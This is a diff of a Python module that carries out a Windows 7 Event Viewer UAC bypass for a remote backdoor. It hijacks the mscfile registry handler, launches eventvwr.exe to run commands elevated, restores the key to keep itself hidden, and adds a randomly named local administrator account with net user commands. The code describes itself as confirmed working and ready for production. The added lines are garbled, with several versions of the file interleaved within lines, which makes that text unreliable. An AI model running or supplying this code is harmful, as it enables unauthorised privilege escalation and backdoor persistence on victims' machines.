@@ -1,157 +1,472 @@
-#!/usr/bin/env python3
-"""
-Windows 7 Privilege Escalation - CONFIRMED WORKING METHODS
-Integrated Event Viewer UAC bypass for backdoor privilege escalation
-Based on successful test results - Ready for production use
+#!/usr/bin/env python3#!/usr/bin/env python3#!/usr/bin/env python3
+
 """
 
-import os
+Windows 7 Privilege Escalation - Event Viewer UAC Bypass""""""
+
+Clean output for remote backdoor control
+
+"""Windows 7 Privilege Escalation - Event Viewer UAC BypassWindows 7 Privilege Escalation - CONFIRMED WORKING METHODS
+
+
+
+import osClean output for remote backdoor controlIntegrated Event Viewer UAC bypass for backdoor privilege escalation
+
 import sys
-import subprocess
+
+import subprocess"""Based on successful test results - Ready for production use
+
 import ctypes
-import winreg
+
+import winreg"""
+
 import time
-import tempfile
-from datetime import datetime
+
+import tempfileimport os
+
+import random
+
+import sysimport os
 
 class Windows7PrivilegeEscalator:
-    """Simplified Windows 7 privilege escalation using confirmed working methods"""
+
+    """Windows 7 privilege escalation using Event Viewer UAC bypass"""import subprocessimport sys
+
     
-    def __init__(self, log_file="win7_privesc.log"):
-        self.log_file = log_file
-        self.current_privileges = self.check_current_privileges()
-        self.log_action("Windows 7 Privilege Escalator initialized - Event Viewer UAC bypass ready")
-    
-    def log_action(self, message):
-        """Log privilege escalation actions"""
-        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        log_entry = f"[{timestamp}] {message}\n"
-        
-        try:
-            with open(self.log_file, 'a', encoding='utf-8') as f:
-                f.write(log_entry)
-                f.flush()
-        except Exception:
-            pass  # Silent fail for logging
-    
-    def check_current_privileges(self):
-        """Check if running as administrator"""
-        try:
-            is_admin = bool(ctypes.windll.shell32.IsUserAnAdmin())
-            return "Administrator" if is_admin else "Standard User"
-        except:
-            return "Unknown"
-    
-    def is_admin(self):
-        """Check if current process has admin privileges"""
-        try:
-            return bool(ctypes.windll.shell32.IsUserAnAdmin())
-        except:
-            return False
-    
-    def get_privilege_info(self):
-        """Get detailed privilege information using whoami command"""
-        try:
-            # Get current user info
-            whoami_result = subprocess.run('whoami', shell=True, capture_output=True, text=True, timeout=10)
-            current_user = whoami_result.stdout.strip() if whoami_result.returncode == 0 else "Unknown"
-            
-            # Get privilege info
-            priv_result = subprocess.run('whoami /priv', shell=True, capture_output=True, text=True, timeout=10)
-            privileges = priv_result.stdout if priv_result.returncode == 0 else "Unable to get privileges"
-            
-            # Get group info
-            groups_result = subprocess.run('whoami /groups', shell=True, capture_output=True, text=True, timeout=10)
-            groups = groups_result.stdout if groups_result.returncode == 0 else "Unable to get groups"
-            
-            return {
-                'current_user': current_user,
-                'is_admin': self.is_admin(),
-                'privileges': privileges,
-                'groups': groups,
-                'escalation_available': not self.is_admin()
-            }
-        except Exception as e:
-            return {
-                'current_user': 'Unknown',
-                'is_admin': False,
-                'privileges': f'Error: {str(e)}',
-                'groups': 'Error getting groups',
-                'escalation_available': True
-            }
-    
+
+    def __init__(self):import ctypesimport subprocess
+
+        pass
+
+    import winregimport ctypes
+
     def eventvwr_uac_bypass(self, payload_command):
-        """
-        CONFIRMED WORKING Event Viewer UAC Bypass for Windows 7
-        This method has been verified to work in testing
-        Perfect for backdoor privilege escalation
-        """
-        self.log_action("Executing Event Viewer UAC bypass...")
-        
+
+        """Core Event Viewer UAC bypass"""import timeimport winreg
+
         try:
-            reg_path = r"Software\Classes\mscfile\shell\open\command"
+
+            reg_path = r"Software\Classes\mscfile\shell\open\command"import tempfileimport time
+
             
-            # Backup original value if exists
+
+            # Backup original registry valueimport randomimport tempfile
+
             original_value = None
-            try:
+
+            try:from datetime import datetime
+
                 key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_READ)
-                original_value, _ = winreg.QueryValueEx(key, "")
+
+                original_value, _ = winreg.QueryValueEx(key, "")class Windows7PrivilegeEscalator:
+
                 winreg.CloseKey(key)
-                self.log_action("Backed up existing registry value")
-            except:
-                self.log_action("No existing registry value found")
-            
-            # Set registry hijack with provided payload
-            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path)
+
+            except:    """Windows 7 privilege escalation using Event Viewer UAC bypass"""class Windows7PrivilegeEscalator:
+
+                pass
+
+                    """Simplified Windows 7 privilege escalation using confirmed working methods"""
+
+            # Set registry hijack
+
+            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path)    def __init__(self):    
+
             winreg.SetValueEx(key, "", 0, winreg.REG_SZ, payload_command)
-            winreg.CloseKey(key)
+
+            winreg.CloseKey(key)        pass    def __init__(self, log_file="win7_privesc.log"):
+
             
-            self.log_action(f"Registry hijack configured: {payload_command}")
+
+            # Launch eventvwr.exe for auto-elevation            self.log_file = log_file
+
+            subprocess.Popen("eventvwr.exe", shell=True)
+
+                def eventvwr_uac_bypass(self, payload_command):        self.current_privileges = self.check_current_privileges()
+
+            # Wait for execution
+
+            time.sleep(12)        """Core Event Viewer UAC bypass"""        self.log_action("Windows 7 Privilege Escalator initialized - Event Viewer UAC bypass ready")
+
             
-            # Launch eventvwr.exe for auto-elevation
+
+            # Restore registry        try:    
+
             try:
-                result = subprocess.Popen("eventvwr.exe", shell=True)
-                self.log_action("eventvwr.exe launched - auto-elevation in progress...")
-            except Exception as e:
-                self.log_action(f"Launch error: {e}")
-                return False
-            
-            # Wait for payload execution
-            time.sleep(10)
-            
-            # Restore registry (important for stealth)
-            try:
-                if original_value:
+
+                if original_value:            reg_path = r"Software\Classes\mscfile\shell\open\command"    def log_action(self, message):
+
                     key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_WRITE)
-                    winreg.SetValueEx(key, "", 0, winreg.REG_SZ, original_value)
+
+                    winreg.SetValueEx(key, "", 0, winreg.REG_SZ, original_value)                    """Log privilege escalation actions"""
+
                     winreg.CloseKey(key)
-                    self.log_action("Registry restored to original value")
-                else:
+
+                else:            # Backup original registry value        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+
                     winreg.DeleteKey(winreg.HKEY_CURRENT_USER, reg_path)
-                    self.log_action("Registry key removed")
-            except Exception as e:
-                self.log_action(f"Registry cleanup: {e}")
-            
-            self.log_action("Event Viewer UAC bypass completed")
+
+            except:            original_value = None        log_entry = f"[{timestamp}] {message}\n"
+
+                pass
+
+                        try:        
+
             return True
-            
+
+                            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_READ)        try:
+
         except Exception as e:
-            self.log_action(f"UAC bypass error: {e}")
-            return False
+
+            return False                original_value, _ = winreg.QueryValueEx(key, "")            with open(self.log_file, 'a', encoding='utf-8') as f:
+
     
-    def execute_admin_command(self, command):
-        """Execute command with admin privileges using Event Viewer bypass"""
-        self.log_action(f"Executing admin command: {command}")
+
+    def execute_admin_command(self, command):                winreg.CloseKey(key)                f.write(log_entry)
+
+        """Execute command with admin privileges"""
+
+        # Create verification file            except:                f.flush()
+
+        verify_file = os.path.join(tempfile.gettempdir(), f"admin_{int(time.time())}.txt")
+
+                        pass        except Exception:
+
+        # Create payload with verification
+
+        payload = f'cmd.exe /c "{command} && echo SUCCESS > {verify_file}"'                        pass  # Silent fail for logging
+
         
-        # Create a unique marker file to verify execution
-        marker_file = os.path.join(tempfile.gettempdir(), f"admin_exec_{int(time.time())}.txt")
-        
-        payload = f'cmd.exe /c "{command} && echo ADMIN_EXEC_SUCCESS > {marker_file}"'
-        
+
+        # Execute using UAC bypass            # Set registry hijack    
+
         success = self.eventvwr_uac_bypass(payload)
-        
+
+                    key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path)    def check_current_privileges(self):
+
         if success:
-            time.sleep(8)  # Allow time for execution
+
+            time.sleep(8)  # Wait for execution            winreg.SetValueEx(key, "", 0, winreg.REG_SZ, payload_command)        """Check if running as administrator"""
+
+            
+
+            # Check verification            winreg.CloseKey(key)        try:
+
+            if os.path.exists(verify_file):
+
+                try:                        is_admin = bool(ctypes.windll.shell32.IsUserAnAdmin())
+
+                    os.remove(verify_file)
+
+                    return True, "Command executed with administrator privileges"            # Launch eventvwr.exe for auto-elevation            return "Administrator" if is_admin else "Standard User"
+
+                except:
+
+                    return True, "Command executed (cleanup failed)"            subprocess.Popen("eventvwr.exe", shell=True)        except:
+
+            else:
+
+                return False, "Command execution not confirmed"                        return "Unknown"
+
+        else:
+
+            return False, "UAC bypass failed"            # Wait for execution    
+
+    
+
+    def create_admin_user(self, username=None, password=None):            time.sleep(12)    def is_admin(self):
+
+        """
+
+        Create admin user - AUTO-GENERATES credentials if not provided                    """Check if current process has admin privileges"""
+
+        
+
+        Args:            # Restore registry        try:
+
+            username: Optional - if None, generates random username like "admin42"
+
+            password: Optional - if None, generates random password like "Pass789!"            try:            return bool(ctypes.windll.shell32.IsUserAnAdmin())
+
+        
+
+        Returns:                if original_value:        except:
+
+            (success, username, password, message)
+
+        """                    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_WRITE)            return False
+
+        # AUTO-GENERATE credentials if not provided
+
+        if not username:                    winreg.SetValueEx(key, "", 0, winreg.REG_SZ, original_value)    
+
+            username = f"admin{random.randint(10, 99)}"  # Generates: admin10, admin42, etc.
+
+        if not password:                    winreg.CloseKey(key)    def get_privilege_info(self):
+
+            password = f"Pass{random.randint(100, 999)}!"  # Generates: Pass123!, Pass789!, etc.
+
+                        else:        """Get detailed privilege information using whoami command"""
+
+        # Create user
+
+        user_success, _ = self.execute_admin_command(f"net user {username} {password} /add")                    winreg.DeleteKey(winreg.HKEY_CURRENT_USER, reg_path)        try:
+
+        if not user_success:
+
+            return False, None, None, "Failed to create user"            except:            # Get current user info
+
+        
+
+        # Add to admin group                pass            whoami_result = subprocess.run('whoami', shell=True, capture_output=True, text=True, timeout=10)
+
+        admin_success, _ = self.execute_admin_command(f"net localgroup administrators {username} /add")
+
+        if not admin_success:                        current_user = whoami_result.stdout.strip() if whoami_result.returncode == 0 else "Unknown"
+
+            return False, username, password, "User created but failed to add to admin group"
+
+                    return True            
+
+        # Verify user exists
+
+        time.sleep(3)                        # Get privilege info
+
+        try:
+
+            check = subprocess.run(f"net user {username}", shell=True, capture_output=True, text=True, timeout=10)        except Exception as e:            priv_result = subprocess.run('whoami /priv', shell=True, capture_output=True, text=True, timeout=10)
+
+            if check.returncode == 0:
+
+                return True, username, password, "Admin user created successfully"            return False            privileges = priv_result.stdout if priv_result.returncode == 0 else "Unable to get privileges"
+
+            else:
+
+                return False, username, password, "User creation verification failed"                
+
+        except:
+
+            return False, username, password, "User verification error"    def execute_admin_command(self, command):            # Get group info
+
+    
+
+    def escalate_privileges(self):        """Execute command with admin privileges"""            groups_result = subprocess.run('whoami /groups', shell=True, capture_output=True, text=True, timeout=10)
+
+        """Test privilege escalation"""
+
+        # Test basic UAC bypass        # Create verification file            groups = groups_result.stdout if groups_result.returncode == 0 else "Unable to get groups"
+
+        test_file = os.path.join(tempfile.gettempdir(), f"uac_test_{int(time.time())}.txt")
+
+        success, _ = self.execute_admin_command(f"echo UAC_SUCCESS > {test_file}")        verify_file = os.path.join(tempfile.gettempdir(), f"admin_{int(time.time())}.txt")            
+
+        
+
+        if success and os.path.exists(test_file):                    return {
+
+            try:
+
+                with open(test_file, 'r') as f:        # Create payload with verification                'current_user': current_user,
+
+                    content = f.read()
+
+                os.remove(test_file)        payload = f'cmd.exe /c "{command} && echo SUCCESS > {verify_file}"'                'is_admin': self.is_admin(),
+
+                if "UAC_SUCCESS" in content:
+
+                    return True, "Event Viewer UAC bypass is working - can execute admin commands"                        'privileges': privileges,
+
+                else:
+
+                    return False, "UAC bypass test failed - file created but content invalid"        # Execute using UAC bypass                'groups': groups,
+
+            except:
+
+                return False, "UAC bypass test failed - file access error"        success = self.eventvwr_uac_bypass(payload)                'escalation_available': not self.is_admin()
+
+        else:
+
+            return False, "UAC bypass test failed - no verification file created"                    }
+
+    
+
+    def get_current_user(self):        if success:        except Exception as e:
+
+        """Get current user info"""
+
+        try:            time.sleep(8)  # Wait for execution            return {
+
+            import ctypes
+
+            username = os.environ.get('USERNAME', 'Unknown')                            'current_user': 'Unknown',
+
+            is_admin = bool(ctypes.windll.shell32.IsUserAnAdmin())
+
+                        # Check verification                'is_admin': False,
+
+            if is_admin:
+
+                return f"Administrator ({username})"            if os.path.exists(verify_file):                'privileges': f'Error: {str(e)}',
+
+            else:
+
+                return f"Standard User ({username})"                try:                'groups': 'Error getting groups',
+
+        except:
+
+            return "Unknown"                    os.remove(verify_file)                'escalation_available': True
+
+
+
+# Create instance function for backdoor integration                    return True, "Command executed with administrator privileges"            }
+
+def create_windows7_privilege_escalator():
+
+    return Windows7PrivilegeEscalator()                except:    
+
+                    return True, "Command executed (cleanup failed)"    def eventvwr_uac_bypass(self, payload_command):
+
+            else:        """
+
+                return False, "Command execution not confirmed"        CONFIRMED WORKING Event Viewer UAC Bypass for Windows 7
+
+        else:        This method has been verified to work in testing
+
+            return False, "UAC bypass failed"        Perfect for backdoor privilege escalation
+
+            """
+
+    def create_admin_user(self, username=None, password=None):        self.log_action("Executing Event Viewer UAC bypass...")
+
+        """Create admin user"""        
+
+        # Generate credentials if not provided        try:
+
+        if not username:            reg_path = r"Software\Classes\mscfile\shell\open\command"
+
+            username = f"admin{random.randint(10, 99)}"            
+
+        if not password:            # Backup original value if exists
+
+            password = f"Pass{random.randint(100, 999)}!"            original_value = None
+
+                    try:
+
+        # Create user                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_READ)
+
+        user_success, _ = self.execute_admin_command(f"net user {username} {password} /add")                original_value, _ = winreg.QueryValueEx(key, "")
+
+        if not user_success:                winreg.CloseKey(key)
+
+            return False, None, None, "Failed to create user"                self.log_action("Backed up existing registry value")
+
+                    except:
+
+        # Add to admin group                self.log_action("No existing registry value found")
+
+        admin_success, _ = self.execute_admin_command(f"net localgroup administrators {username} /add")            
+
+        if not admin_success:            # Set registry hijack with provided payload
+
+            return False, username, password, "User created but failed to add to admin group"            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path)
+
+                    winreg.SetValueEx(key, "", 0, winreg.REG_SZ, payload_command)
+
+        # Verify user exists            winreg.CloseKey(key)
+
+        time.sleep(3)            
+
+        try:            self.log_action(f"Registry hijack configured: {payload_command}")
+
+            check = subprocess.run(f"net user {username}", shell=True, capture_output=True, text=True, timeout=10)            
+
+            if check.returncode == 0:            # Launch eventvwr.exe for auto-elevation
+
+                return True, username, password, "Admin user created successfully"            try:
+
+            else:                result = subprocess.Popen("eventvwr.exe", shell=True)
+
+                return False, username, password, "User creation verification failed"                self.log_action("eventvwr.exe launched - auto-elevation in progress...")
+
+        except:            except Exception as e:
+
+            return False, username, password, "User verification error"                self.log_action(f"Launch error: {e}")
+
+                    return False
+
+    def escalate_privileges(self):            
+
+        """Test privilege escalation"""            # Wait for payload execution
+
+        # Test basic UAC bypass            time.sleep(10)
+
+        test_file = os.path.join(tempfile.gettempdir(), f"uac_test_{int(time.time())}.txt")            
+
+        success, _ = self.execute_admin_command(f"echo UAC_SUCCESS > {test_file}")            # Restore registry (important for stealth)
+
+                    try:
+
+        if success and os.path.exists(test_file):                if original_value:
+
+            try:                    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_WRITE)
+
+                with open(test_file, 'r') as f:                    winreg.SetValueEx(key, "", 0, winreg.REG_SZ, original_value)
+
+                    content = f.read()                    winreg.CloseKey(key)
+
+                os.remove(test_file)                    self.log_action("Registry restored to original value")
+
+                if "UAC_SUCCESS" in content:                else:
+
+                    return True, "Event Viewer UAC bypass is working - can execute admin commands"                    winreg.DeleteKey(winreg.HKEY_CURRENT_USER, reg_path)
+
+                else:                    self.log_action("Registry key removed")
+
+                    return False, "UAC bypass test failed - file created but content invalid"            except Exception as e:
+
+            except:                self.log_action(f"Registry cleanup: {e}")
+
+                return False, "UAC bypass test failed - file access error"            
+
+        else:            self.log_action("Event Viewer UAC bypass completed")
+
+            return False, "UAC bypass test failed - no verification file created"            return True
+
+                
+
+    def get_current_user(self):        except Exception as e:
+
+        """Get current user info"""            self.log_action(f"UAC bypass error: {e}")
+
+        try:            return False
+
+            import ctypes    
+
+            username = os.environ.get('USERNAME', 'Unknown')    def execute_admin_command(self, command):
+
+            is_admin = bool(ctypes.windll.shell32.IsUserAnAdmin())        """Execute command with admin privileges using Event Viewer bypass"""
+
+                    self.log_action(f"Executing admin command: {command}")
+
+            if is_admin:        
+
+                return f"Administrator ({username})"        # Create a unique marker file to verify execution
+
+            else:        marker_file = os.path.join(tempfile.gettempdir(), f"admin_exec_{int(time.time())}.txt")
+
+                return f"Standard User ({username})"        
+
+        except:        payload = f'cmd.exe /c "{command} && echo ADMIN_EXEC_SUCCESS > {marker_file}"'
+
+            return "Unknown"        
+
+        success = self.eventvwr_uac_bypass(payload)
+
+# Create instance function for backdoor integration        
+
+def create_windows7_privilege_escalator():        if success:
+
+    return Windows7PrivilegeEscalator()            time.sleep(8)  # Allow time for execution
             
             # Check for execution marker
             if os.path.exists(marker_file):
